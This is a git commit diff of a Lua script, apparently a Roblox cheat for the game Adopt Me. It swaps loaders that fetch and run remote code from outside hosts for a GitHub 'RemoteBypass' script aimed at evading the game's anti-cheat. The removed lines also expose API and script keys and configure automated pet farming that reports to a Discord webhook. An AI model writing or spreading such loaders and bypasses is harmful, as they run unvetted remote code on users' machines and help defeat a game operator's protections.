361084b438099b5e6bce86027e72a36621b24c8f
greg66n <darien95sm@hotmail.com>
2025-02-03 04:20:56 -0800

    Update adopt1.lua

--- adopt1.lua
+++ adopt1.lua
@@ -1,25 +1,5 @@
-task.spawn(function()
-    task.wait(35)
-    getgenv().API_KEY = "RukIIrukYPFoGnQUcD7c"
-    loadstring(game:HttpGet("http://ii.sebas.sbs:4241/adoptme/dashboard.lua"))()
-end)
-
-task.spawn(function()
-   -- ARCEUS, CODEX ETC
-script_key="NxzplPKcRYahKMvLcZtfTAOQURrRclwP";
-getgenv().Config = {
-    ["Winter_EVENT"] = false,
-    ["PetFarmActive"] = true,
-    ["EggFarmActive"] = false,
-    ["Blur_username"] = true,
-    ["Blazing_Lion_Log"] = false,
-    ["DiscordId"] = "942321951010086922",
-    ["Webhook"] = "https://discord.com/api/webhooks/123456",
-}
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/66567bfd337b57eb059b58dbe1badb89.lua"))()
-end)
-
-wait(1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenijo/AdoptMe-RemoteBypass/main/Bypass.lua"))()
+wait(5)
 local locations = {"MainMap"}
 
 for _, location in ipairs(locations) do
